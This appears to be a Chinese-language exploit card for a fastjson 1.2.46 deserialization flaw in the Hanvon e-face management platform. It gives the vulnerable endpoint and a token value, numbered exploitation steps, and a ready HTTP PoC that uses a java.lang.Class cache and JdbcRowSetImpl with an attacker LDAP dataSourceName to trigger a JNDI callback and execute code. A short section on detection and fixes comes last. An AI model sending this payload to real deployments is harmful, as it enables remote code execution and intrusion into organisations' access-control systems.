---
id: web-java-deser-fastjson-hanvon-addappointment-jdbcrowset-jndi
title: 汉王e脸通 fastjson 1.2.46 反序列化：addVisitDeviceAppointmentInfoTest 的 parseObject 触发 JdbcRowSetImpl JNDI
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson-parseobject-jdbcrowset-jndi
aliases:
- 汉王e脸通 fastjson
- addVisitDeviceAppointmentInfoTest 反序列化
- RenZhengCommandTpm parseObject
- JdbcRowSetImpl JNDI
- fastjson 1.2.46
tags:
- web
- java
- fastjson
- deserialization
- jndi
- jdbcrowsetimpl
- rce
- hanvon
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
affected_versions: fastjson 1.2.46（原文标记）；汉王e脸通版本未标注
verification:
  verified_by: verifier-V225
  verified_at: '2026-11-07T07:00:14+08:00'
  notes: 已对照原文与图28-31核对：addAppointment(httpReq2JSON读取请求体)→JSON.parseObject(json)→fromObject/toBean绑定RenZhengCommandTpm；项目fastjson-1.2.46；PoC字段a(java.lang.Class缓存)/b(JdbcRowSetImpl dataSourceName ldap/autoCommit)与原文逐字一致；端点/recoToken/X-Authorization与原文一致；原文未执行PoC、无LDAP回连证据；dedup最高候选为通用fastjson JdbcRowSet卡(likely_duplicate)，worker按append_scenario记录产品化场景，理由成立
---

## 一句话结论

汉王e脸通的 `VisitorDeviceInteractionController.addAppointment` 把请求体读成字符串后直接 `JSON.parseObject(json, RenZhengCommandTpm.class)`，项目内置 fastjson 1.2.46；攻击者向 `/manage/visitorDeviceInteraction/addVisitDeviceAppointmentInfoTest.do` 提交带 `@type` 的 JdbcRowSetImpl JSON，并让 `dataSourceName` 指向恶意 LDAP/RMI 服务，即可触发 JNDI 注入并在目标上执行代码。

## 原理

- 入口：`addAppointment(HttpServletRequest request)` 调用 `httpReq2JSON(request)`，该方法用 `ServletInputStream` + `BufferedReader` 读取整个请求体并返回字符串；随后对字符串执行 `JSON.parseObject(...)`，再通过 `JSONObject.fromObject` / `JSONObject.toBean` 绑定到 `RenZhengCommandTpm.class`。
- 项目 `WEB-INF` 反编译源码目录中存在 `fastjson-1.2.46`，属于存在 AutoType/缓存绕过历史的版本。
- PoC 使用两段对象：
  - `a`：`{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}`，利用 `MiscCodec` 把目标类加载并写入 fastjson 全局类缓存；
  - `b`：`{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<attacker>:<port>/<path>","autoCommit":true}`，反序列化时调用 setter，`autoCommit` 触发 `connect()`，后者对 `dataSourceName` 做 JNDI lookup。
- 攻击者控制的 LDAP/RMI 服务返回恶意 `Reference`/序列化对象，目标加载后执行代码；这是 fastjson 1.2.46/1.2.47 一类的 `java.lang.Class` 缓存 + JdbcRowSetImpl JNDI 链。
- 端点需要 `recoToken` 参数；可通过本文章的 recoToken 伪造或已知 token 通过拦截器。

## 触发条件

- 目标为汉王e脸通综合管理平台（文章基于反编译源码审计，未标注具体版本），且内置 fastjson 1.2.46（或同版本区间的受影响版本）。
- 端点 `/manage/visitorDeviceInteraction/addVisitDeviceAppointmentInfoTest.do` 可达，并携带可用的 `recoToken`（或通过鉴权绕过）。
- 目标可出网访问攻击者控制的 LDAP/RMI 服务；高版本 JDK 需配合本地 gadget/反序列化链绕过远程 codebase 限制。
- 服务端对 `JSON.parseObject` 使用默认配置（未开启 safeMode、未禁用 AutoType）。

## 利用步骤

1. 启动恶意 LDAP/RMI 服务，准备可执行 payload（如 JNDI 注入 + 本地 gadget）。
2. 构造 JSON body：保留业务字段 `isNeedMeetingPermission`、`COMMAND`、`PARAM`，加入 `a`（java.lang.Class 缓存）与 `b`（JdbcRowSetImpl）对象。
3. 向 `POST /manage/visitorDeviceInteraction/addVisitDeviceAppointmentInfoTest.do?recoToken=<token>` 发送请求，`X-Authorization: whoami` 可按原文保留。
4. 目标 `parseObject` 时触发 JNDI lookup；在 LDAP/RMI 服务端观察回连并确认命令执行。
5. 原文仅给出 PoC 请求，未附 LDAP 回连或命令执行结果截图；实际可用性依赖 JDK 版本、fastjson 配置与网络出站。

## PoC

```http
POST /manage/visitorDeviceInteraction/addVisitDeviceAppointmentInfoTest.do?recoToken=SGUsqvF7cVS HTTP/1.1
Host: <target>
X-Authorization: whoami
Content-Type: application/json

{
  "isNeedMeetingPermission": "true",
  "COMMAND": "AddAppointment",
  "PARAM": {},
  "a": {
    "@type": "java.lang.Class",
    "val": "com.sun.rowset.JdbcRowSetImpl"
  },
  "b": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://<attacker>:<port>/<path>",
    "autoCommit": true
  }
}
```

原文截图确认 Controller 对请求体执行 `JSON.parseObject(...)` 并以 `RenZhengCommandTpm.class` 绑定，项目目录为 fastjson-1.2.46；未执行 PoC。

## 变体与关联

- 载荷变体：`java.lang.Class` 缓存 + JdbcRowSetImpl（本 PoC）、C3P0 JndiRef、TemplatesImpl、BCEL 等，取决于 fastjson 版本与依赖。
- 入口变体：项目内其它 `.parseObject(` 调用（原文搜索到 43 个文件 94 处匹配）可能同样存在反序列化面。
- 关联：`recoToken` 可通过可逆加密伪造；也可先通过任意文件读取获取配置/密钥，再打本接口。
- 同类：Fastjson JdbcRowSetImpl JNDI 通用卡、Fastjson 1.2.47 类缓存绕过卡、大华 fastjson 1.2.44 接口 RCE。

## 检测与防御

- 修复：升级 fastjson 到安全版本并开启 safeMode；不要用 `parseObject(String, Class)` 解析不可信请求体，改用显式 DTO 字段白名单/Jackson 等安全绑定。
- 检测：请求体出现 `@type`、`java.lang.Class`、`JdbcRowSetImpl`、`dataSourceName`、`ldap://`、`rmi://`；目标进程发起异常 LDAP/RMI 连接；fastjson 版本低于安全基线。
- 加固：限制服务器出站到攻击者可控 LDAP/RMI；JDK 升级并禁用远程 codebase；WAF 拦截 fastjson AutoType 关键字；对该接口做鉴权与参数校验。
